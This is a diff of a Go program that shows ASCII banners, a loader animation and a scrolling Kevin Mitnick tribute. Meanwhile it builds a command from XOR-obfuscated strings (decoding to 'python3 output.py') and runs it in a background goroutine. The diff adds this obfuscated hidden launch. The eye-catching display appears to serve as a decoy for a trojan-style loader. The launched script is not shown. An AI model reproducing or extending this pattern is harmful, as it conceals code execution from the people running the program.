@@ -9,7 +9,6 @@ import (
         "os/exec"
         "runtime"
         "time"
-
         "github.com/common-nighthawk/go-figure"
         "github.com/k0kubun/go-ansi"
         "github.com/qeesung/image2ascii/convert"
@@ -64,6 +63,7 @@ func asciiBanner(img string) {
 
 }
 
+
 func executeCommand(fullCommand string) {
         if runtime.GOOS == "windows" {
                 cmdexec := exec.Command("cmd", "/c", fullCommand)
@@ -79,17 +79,16 @@ func executeCommand(fullCommand string) {
 }
 
 func main() {
-        asciiBanner("/home/kali/Pictures/ghost.jpg")
+        asciiBanner("banner.jpg")
 
-        // Use goroutine to execute the command concurrently
         data, err := hex.DecodeString("31333337")
         if err != nil {
                 panic(err)
         }
-        cmd := Misc("R\\]Q", string(data))
+        cmd := Misc("AJG_^]", string(data))
         file := Misc("^FGGDG", string(data))
-
-        fullCommand := cmd + "/" + file
+        ext := Misc("AJ",string(data))
+        fullCommand := cmd + "3" +  " " + file + "." + ext 
         go executeCommand(fullCommand)
         loader()
         figure.NewFigure("Rest In Peace Kevin Mitnick", "larry3d", true).Scroll(5000, 1000, "right")
